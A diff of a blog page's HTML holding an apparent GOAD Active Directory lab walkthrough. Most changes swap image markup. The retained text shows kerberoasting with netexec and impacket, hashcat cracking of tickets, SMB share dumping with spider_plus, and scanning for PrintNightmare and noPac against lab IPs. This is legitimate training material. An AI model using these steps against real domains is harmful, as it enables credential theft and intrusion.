@@ -22,6 +22,27 @@
 <meta property="article:modified_time" content="2024-11-14T01:29:29+03:00" />
 
 
+     <!-- Favicons 
+    <link href="https://devopsengineerdan.github.io/assets/img/apple-touch-icon.png" rel="apple-touch-icon" />
+
+    <!-- Google Fonts 
+    <link href="https://devopsengineerdan.github.io/assets/vendor/google/css/icons.css" rel="stylesheet" />
+
+<!-- Vendor CSS Files   -->
+   <link href="https://devopsengineerdan.github.io/assets/vendor/aos/aos.css" rel="stylesheet" /> 
+ <!--    <link href="https://devopsengineerdan.github.io/assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet" /> -->
+  <!--  <link
+      href="https://devopsengineerdan.github.io/assets/vendor/glightbox/css/glightbox.min.css"
+      rel="stylesheet"
+    />
+    <link href="https://devopsengineerdan.github.io/assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet" /> 
+
+
+    <!-- Template Main CSS File  
+    <link href="https://devopsengineerdan.github.io/assets/assets/css/style.css" rel="stylesheet" />   -->
+    
+
+   
   </head>
   <body>
     <header class="app-header">
@@ -93,7 +114,28 @@
     </header>
     <div class="post-content">
       <hr>
-<p><img src="https://github.com/user-attachments/assets/32c94610-84d8-4a8c-a73a-609cd34d2624" alt="goad_part2_domain"></p>
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/goad_part2_domain.png" 
+                  class="img-fluid"
+                  alt="goad_part2_domain"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <blockquote>
 <h3 id="table-of-contents">Table of Contents</h3>
 </blockquote>
@@ -110,7 +152,29 @@
 <li>With valid credentials, we can perform more enumeration using tools like bloodhound and also explore various attacks such as kerberoasting. We will explore kerberoasting and domain enumeration using bloodhound…..</li>
 </ul>
 <h2 id="kerberoasting-in-the-north-domain">Kerberoasting in the north domain</h2>
-<p><img src="https://github.com/user-attachments/assets/077ccce7-ed98-4800-aee8-83f15893809a" alt="goad_part2_1"></p>
+
+
+      <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/goad_part2_1.png" 
+                  class="img-fluid"
+                  alt="goad_part2_1"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <ul>
 <li>With our valid credentials we can try and abuse kerberoasting to obtain more credential material that can grant further access to systems and data.</li>
 <li>Kerberoasting involves attempting to crack passwords of service accounts by exploiting the Kerberos authentication protocol.</li>
@@ -118,12 +182,62 @@
 <li>Using netexec:</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">nxc ldap <span style="color:#ae81ff">192.168.56.11</span> <span style="color:#f92672">-</span>u brandon.stark <span style="color:#f92672">-</span>p <span style="color:#e6db74">&#39;iseedeadpeople&#39;</span> <span style="color:#f92672">-</span>d north.sevenkingdoms.local <span style="color:#f92672">--</span>kerberoasting KERBEROASTING
-</code></pre></div><p><img src="https://github.com/user-attachments/assets/a2ed153d-e430-4a0a-8d7f-d175cfb4e8d2" alt="goad_part2_2"></p>
+</code></pre></div>
+      
+      
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/goad_part2_2.png" 
+                  class="img-fluid"
+                  alt="goad_part2_2"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
+      
 <ul>
 <li>Using impacket:</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">impacket<span style="color:#f92672">-</span>GetUserSPNs <span style="color:#f92672">-</span>request <span style="color:#f92672">-</span>dc<span style="color:#f92672">-</span>ip <span style="color:#ae81ff">192.168.56.11</span> north.sevenkingdoms.local<span style="color:#f92672">/</span>brandon.stark<span style="color:#f92672">:</span>iseedeadpeople
-</code></pre></div><p><img src="https://github.com/user-attachments/assets/96e24b3e-2cf0-4fb4-94c9-d85bb627ab97" alt="goad_part2_3"></p>
+</code></pre></div>
+      
+      
+      
+      <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/goad_part2_3.png" 
+                  class="img-fluid"
+                  alt="goad_part2_3"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+ 
+      
+      
 <ul>
 <li>We obtain 3 kerberoastable users: sansa.stark, jon.snow and sql_svc</li>
 </ul>
@@ -131,35 +245,246 @@
 <ul>
 <li>Running hashcat in the following mode with a rockyou password list:</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/81ae2678-4415-4a6e-89dd-6159a939f266" alt="goad_part2_4"></p>
+
+
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/goad_part2_4.png" 
+                  class="img-fluid"
+                  alt="goad_part2_4"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <ul>
 <li>We get the plaintext credentials of the jon.snow user.</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">hashcat <span style="color:#f92672">-</span>m <span style="color:#ae81ff">13100</span> <span style="color:#f92672">-</span>a <span style="color:#ae81ff">0</span> KERBEROASTING <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>share<span style="color:#f92672">/</span>wordlists<span style="color:#f92672">/</span>rockyou.txt.gz
-</code></pre></div><p><img src="https://github.com/user-attachments/assets/8e54345d-7806-4602-9c4b-83f39d705305" alt="goad_part2_5"></p>
+</code></pre></div>
+      
+
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/goad_part2_5.png" 
+                  class="img-fluid"
+                  alt="goad_part2_5"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
+      
+      
 <h2 id="spidering-and-dumping-shares">Spidering and Dumping Shares</h2>
-<p><img src="https://github.com/user-attachments/assets/4f048a00-4ef5-4269-8a60-a1f2b42dc918" alt="goad_part2_6"></p>
+
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/goad_part2_6.png" 
+                  class="img-fluid"
+                  alt="goad_part2_6"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <ul>
 <li>Check for shares and permissions on them.</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s"> nxc smb <span style="color:#ae81ff">192.168.56.10-23</span> <span style="color:#f92672">-</span>u jon.snow <span style="color:#f92672">-</span>p iknownothing <span style="color:#f92672">-</span>d north.sevenkingdoms.local <span style="color:#f92672">--</span>shares
-</code></pre></div><p><img src="https://github.com/user-attachments/assets/c90eda41-81f6-48c9-8bdf-7a246ad57a30" alt="goad_part2_7"></p>
+</code></pre></div>
+      
+      
+      
+      
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/goad_part2_7.png" 
+                  class="img-fluid"
+                  alt="goad_part2_7"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
+      
+      
 <ul>
 <li>Dump all files from all the readable shares.</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s"> nxc smb <span style="color:#ae81ff">192.168.56.10-23</span> <span style="color:#f92672">-</span>u jon.snow <span style="color:#f92672">-</span>p iknownothing <span style="color:#f92672">-</span>d north.sevenkingdoms.local <span style="color:#f92672">-</span>M spider_plus <span style="color:#f92672">-</span>o DOWNLOAD_FLAG<span style="color:#f92672">=</span><span style="color:#66d9ef">TRUE</span>
-</code></pre></div><p><img src="https://github.com/user-attachments/assets/2c32799d-13db-46c7-8617-e4c625ebd0d7" alt="goad_part2_8"></p>
+</code></pre></div>
+      
+      
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/goad_part2_8.png" 
+                  class="img-fluid"
+                  alt="goad_part2_8"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
+      
 <ul>
 <li>We have a couple of interesting dumped files.</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/e55c97c9-4c47-4d76-b50e-dadc5e46bec1" alt="goad_part2_9"></p>
+
+
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/goad_part2_9.png" 
+                  class="img-fluid"
+                  alt="goad_part2_9"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <ul>
 <li>We discover credentials to jeor.mormont user.</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/e25fc7de-cbcb-49b2-8b50-1653eac34c9b" alt="goad_part2_10"></p>
-<p><img src="https://github.com/user-attachments/assets/0cebbe58-193a-4f53-8f46-7ed839c96eb8" alt="goad_part2_11"></p>
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/goad_part2_10.png" 
+                  class="img-fluid"
+                  alt="goad_part2_10"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
+
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/goad_part2_11.png" 
+                  class="img-fluid"
+                  alt="goad_part2_11"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
+
 <h2 id="known-vulnerabilities">Known Vulnerabilities</h2>
-<p><img src="https://github.com/user-attachments/assets/486cbc51-561a-42da-a586-64a25b385c80" alt="goad_part2_12"></p>
+
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/goad_part2_12.png" 
+                  class="img-fluid"
+                  alt="goad_part2_12"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 <ul>
 <li>Some of these vulnerabilities require credentials to enumerate so we will use a domain user’s credentials with netexec, to check the various known vulnerabilities.</li>
 </ul>
@@ -167,7 +492,29 @@
 </code></pre></div><ul>
 <li>We are able to identify printnightmare and nopac on winterfell:</li>
 </ul>
-<p><img src="https://github.com/user-attachments/assets/333c11dd-0c8f-484b-9986-11fcbf3bfd93" alt="goad_part2_13"></p>
+
+
+       <!-- ======= Portfolio Section ======= -->
+      <section id="portfolio" class="portfolio">
+        <div class="container" data-aos="fade-up">
+          <div
+            class="row portfolio-container"
+            data-aos="fade-up"
+            data-aos-delay="200"
+          >
+            <div class="col-lg-4 col-md-6 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <img
+                  src="/assets/goad_part2_13.png" 
+                  class="img-fluid"
+                  alt="goad_part2_13"
+                />
+              
+              </div>    
+            </div>
+
+	  </div></div></section>
+
 
     </div>
     <div class="post-footer">
@@ -233,6 +580,23 @@
         </script>
         <script id="dsq-count-scr" src="//engineer-dancun.disqus.com/count.js" async></script>
     </main>
+
+
+
+
+     <!-- Vendor JS Files -->
+    <script src="https://devopsengineerdan.github.io/assets/vendor/purecounter/purecounter_vanilla.js"></script>
+    <script src="https://devopsengineerdan.github.io/assets/vendor/aos/aos.js"></script>
+    <script src="https://devopsengineerdan.github.io/assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+    <script src="https://devopsengineerdan.github.io/assets/vendor/glightbox/js/glightbox.min.js"></script>
+    <script src="https://devopsengineerdan.github.io/assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
+    <script src="https://devopsengineerdan.github.io/assets/vendor/swiper/swiper-bundle.min.js"></script>
+    <!-- <script src="https://devopsengineerdan.github.io/assets/vendor/waypoints/noframework.waypoints.js"></script> -->
+	  
+    <!-- Template Main JS File -->
+    <script src="https://devopsengineerdan.github.io/assets/js/main.js"></script>
+
+    
   </body>
 </html>
 
